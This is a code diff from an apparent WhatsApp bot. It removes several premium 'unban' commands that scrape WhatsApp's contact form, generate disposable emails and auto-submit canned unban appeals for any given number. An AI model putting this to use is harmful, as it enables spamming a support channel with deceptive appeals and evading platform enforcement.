-let xeonxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
-let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
-let cookie = xeonxos.headers["set-cookie"].join("; ")
-const cheerio = require('cheerio');
-let $ = cheerio.load(xeonxos.data)
-let $form = $("form");
-let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
-let form = new URLSearchParams()
-form.append("jazoest", $form.find("input[name=jazoest]").val())
-form.append("lsd", $form.find("input[name=lsd]").val())
-form.append("step", "submit")
-form.append("country_selector", "INDIA")
-form.append("phone_number", xeonnumx)
-form.append("email", email.data[0])
-form.append("email_confirm", email.data[0])
-form.append("platform", "ANDROID")
-form.append("your_message", "Equipe, o sistema de vocês baniram meu número por engano. Peço que vocês reativem meu número pois tenho família em outro país e preciso me comunicar com eles")
-form.append("__user", "0")
-form.append("__a", "1")
-form.append("__csr", "")
-form.append("__req", "8")
-form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
-form.append("dpr", "1")
-form.append("__ccg", "UNKNOWN")
-form.append("__rev", "1006630858")
-form.append("__comment_req", "0")
-let res = await axioss({
-  url,
-  method: "POST",
-  data: form,
-  headers: {
-  cookie
-}
-})
-XeonBotInc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
-}
-break
-case 'unbanv3': {
-if (!isPremium) return replyprem(mess.premium)
-if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 916969696969`)
-let xeonnumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
-let xeontesx = await XeonBotInc.onWhatsApp(xeonnumx)
-if (xeontesx.length == 0) return replygcxeon(`Enter a valid and registered number on WhatsApp!!!`)
-let axioss = require("axios")  
-let xeonxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
-let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
-let cookie = xeonxos.headers["set-cookie"].join("; ")
-const cheerio = require('cheerio');
-let $ = cheerio.load(xeonxos.data)
-let $form = $("form");
-let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
-let form = new URLSearchParams()
-form.append("jazoest", $form.find("input[name=jazoest]").val())
-form.append("lsd", $form.find("input[name=lsd]").val())
-form.append("step", "submit")
-form.append("country_selector", "INDIA")
-form.append("phone_number", xeonnumx)
-form.append("email", email.data[0])
-form.append("email_confirm", email.data[0])
-form.append("platform", "ANDROID")
-form.append("your_message", "Kepada pihak WhatsApp yang bijak Sana kenapa akun WhatsApp saya terblokir padahal aktifitas WhatsApp messenger saya normal normal saja mohon dibukakan kembali akun WhatsApp saya dengan ini saya cantumkan kode nomor akun WhatsApp messenger saya sekian banyak Terimakasih")
-form.append("__user", "0")
-form.append("__a", "1")
-form.append("__csr", "")
-form.append("__req", "8")
-form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
-form.append("dpr", "1")
-form.append("__ccg", "UNKNOWN")
-form.append("__rev", "1006630858")
-form.append("__comment_req", "0")
-let res = await axioss({
-  url,
-  method: "POST",
-  data: form,
-  headers: {
-  cookie
-}
-})
-XeonBotInc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
-}
-break
-case 'unbanv4': {
-if (!isPremium) return replyprem(mess.premium)
-if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 916969696969`)
-let xeonnumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
-let xeontesx = await XeonBotInc.onWhatsApp(xeonnumx)
-if (xeontesx.length == 0) return replygcxeon(`Enter a valid and registered number on WhatsApp!!!`)
-let axioss = require("axios")  
-let xeonxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
-let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
-let cookie = xeonxos.headers["set-cookie"].join("; ")
-const cheerio = require('cheerio');
-let $ = cheerio.load(xeonxos.data)
-let $form = $("form");
-let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
-let form = new URLSearchParams()
-form.append("jazoest", $form.find("input[name=jazoest]").val())
-form.append("lsd", $form.find("input[name=lsd]").val())
-form.append("step", "submit")
-form.append("country_selector", "INDIA")
-form.append("phone_number", xeonnumx)
-form.append("email", email.data[0])
-form.append("email_confirm", email.data[0])
-form.append("platform", "ANDROID")
-form.append("your_message", "مرحبًا whatsapp ، تم حظر حسابي بشكل دائم أو مؤقت ، يرجى إلغاء حظر حسابي\nالرقم")
-form.append("__user", "0")
-form.append("__a", "1")
-form.append("__csr", "")
-form.append("__req", "8")
-form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
-form.append("dpr", "1")
-form.append("__ccg", "UNKNOWN")
-form.append("__rev", "1006630858")
-form.append("__comment_req", "0")
-let res = await axioss({
-  url,
-  method: "POST",
-  data: form,
-  headers: {
-  cookie
-}
-})
-XeonBotInc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
-}
-break
-case 'unbanv5': {
-if (!isPremium) return replyprem(mess.premium)
-if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 916969696969`)
-let xeonnumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
-let xeontesx = await XeonBotInc.onWhatsApp(xeonnumx)
-if (xeontesx.length == 0) return replygcxeon(`Enter a valid and registered number on WhatsApp!!!`)
-let axioss = require("axios")  
-let xeonxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
-let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
-let cookie = xeonxos.headers["set-cookie"].join("; ")
-const cheerio = require('cheerio');
-let $ = cheerio.load(xeonxos.data)
-let $form = $("form");
-let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
-let form = new URLSearchParams()
-form.append("jazoest", $form.find("input[name=jazoest]").val())
-form.append("lsd", $form.find("input[name=lsd]").val())
-form.append("step", "submit")
-form.append("country_selector", "INDIA")
-form.append("phone_number", xeonnumx)
-form.append("email", email.data[0])
-form.append("email_confirm", email.data[0])
-form.append("platform", "ANDROID")
-form.append("your_message", "Halo pak, Akun Whatsapp Saya diblokir Saya Maaf Saya Telah Menginstal Aplikasi Pihak Ketiga Secara Tidak Sengaja. Harap Buka Blokir Akun Saya Sesegera Mungkin. Terimakasih")
-form.append("__user", "0")
-form.append("__a", "1")
-form.append("__csr", "")
-form.append("__req", "8")
-form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
-form.append("dpr", "1")
-form.append("__ccg", "UNKNOWN")
-form.append("__rev", "1006630858")
-form.append("__comment_req", "0")
-let res = await axioss({
-  url,
-  method: "POST",
-  data: form,
-  headers: {
-  cookie
-}
-})
-XeonBotInc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
-}
-break
 
             default:
                 if (budy.startsWith('=>')) {
@@ -10324,6 +12293,7 @@ forwardingScore: 9999999,
 isForwarded: true
 }})
 if (e.includes("conflict")) return
+if (e.includes("Cannot derive from empty media key")) return
 if (e.includes("not-authorized")) return
 if (e.includes("already-exists")) return
 if (e.includes("rate-overlimit")) return
